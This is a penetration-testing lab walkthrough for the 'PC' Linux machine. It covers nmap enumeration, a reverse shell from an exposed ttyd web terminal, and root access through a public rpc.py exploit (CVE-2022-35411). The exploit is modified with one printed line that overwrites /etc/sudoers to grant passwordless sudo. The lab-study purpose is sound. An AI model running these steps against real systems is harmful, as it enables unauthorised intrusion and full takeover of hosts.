---
title: PC PGP walkthrough
description: Target - PC, OS - Linux, Difficulty - Intermediate
readTime: 12 min read
date: 01-05-2026
image: ../assets/images/pc/pci.png
---
---

#### ***Enumeration***

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -n -sVC -p- -T5 --open -Pn -oN PC_nmap 192.168.160.210

Nmap scan report for 192.168.160.210

Host is up (0.32s latency).
Not shown: 65220 closed tcp ports (reset), 313 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
8000/tcp open  http    ttyd 1.7.3-a2312cb (libwebsockets 3.2.0)
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-title: ttyd - Terminal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Discovered a web terminal running on port 8000. The user account in use was `user`

![web_page](/1dragon/assets/images/pc/Pasted%20image%2020260114064741.png)

Checked for busybox and nc and they exist hence, executed a reverse shell command with busybox and nc to connect local.

![shell_conn](/1dragon/assets/images/pc/Pasted%20image%2020260114065046.png)

---

#### ***Initial Access***

Had a listener running at port 4444.
Successfully captured the shell as user. However there was not local flag present.

![local](/1dragon/assets/images/pc/Pasted%20image%2020260114070833.png)


---

#### ***Privilege Escalation***

Further analyzed the directories and discovered rpc.py at `/opt/` .

![rpc](/1dragon/assets/images/pc/Pasted%20image%2020260114072612.png)

The contents of the rpc.py 

```
cat rpc.py

from typing import AsyncGenerator
from typing_extensions import TypedDict

import uvicorn
from rpcpy import RPC

app = RPC(mode="ASGI")


@app.register
async def none() -> None:
    return


@app.register
async def sayhi(name: str) -> str:
    return f"hi {name}"


@app.register
async def yield_data(max_num: int) -> AsyncGenerator[int, None]:
    for i in range(max_num):
        yield i


D = TypedDict("D", {"key": str, "other-key": str})


@app.register
async def query_dict(value: str) -> D:
    return {"key": value, "other-key": value}


if __name__ == "__main__":
    uvicorn.run(app, interface="asgi3", port=65432)
```

Upon searching about rpc.py found an [exploit](https://github.com/ehtec/rpcpy-exploit/blob/main/rpcpy-exploit.py). It has a CVE-2022-35411

Modified the main function in the exploit to add the account user  in to sudoers list.

```
def main():
    exec_command('echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers')
```

Transferred the exploit to the target  and  modified the permission to execute the exploit using  `chmod +x rpcexp.py`
Post execution of the exploit executed `sudo su` and achieved root shell. 
Successfully captured the root flag.

![](/1dragon/assets/images/pc/Pasted%20image%2020260114081037.png)

---

										Target compromised - |^| ^ ( |< 3
